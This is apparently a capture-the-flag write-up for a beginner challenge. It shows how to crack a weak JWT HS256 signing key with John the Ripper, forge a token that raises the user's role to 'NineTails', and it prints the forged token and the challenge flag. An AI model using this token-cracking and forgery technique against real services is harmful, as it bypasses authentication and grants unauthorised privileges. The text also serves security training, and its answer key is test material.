# Beginner/Secret-of-Kurama

Madara attacked leaf village. everyone wants Naruto to turn into Nine-Tails, Naruto don't know what's the SECRET to change its role to 'NineTails'? can you as a shinobi help Naruto??? username: Naruto Password: Chakra

http://34.132.132.69:8004/

## Solution

In the website we got a page `/secret_of_Kurama` after login. We have a JWT token as well.

The task is obvious, crack the JWT HS256 key and manipulate the JWT token, and change the role to `NineTails`.

I use John-The-Ripper to crack the key:

```bash
john jwt.txt --format=HMAC-SHA256
```

Got the key `minato`.

The modified JWT is:

```plaintext
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ik5hcnV0byIsInJvbGUiOiJOaW5lVGFpbHMifQ.rDZ26ZE_F4l0Ve4E-2sKP4qKNuadhLU8nrThW7YGVPg
```

## Flag

```plaintext
flag{y0u_ar3_tru3_L34F_sh1n0b1_bf56gtr59894}
```

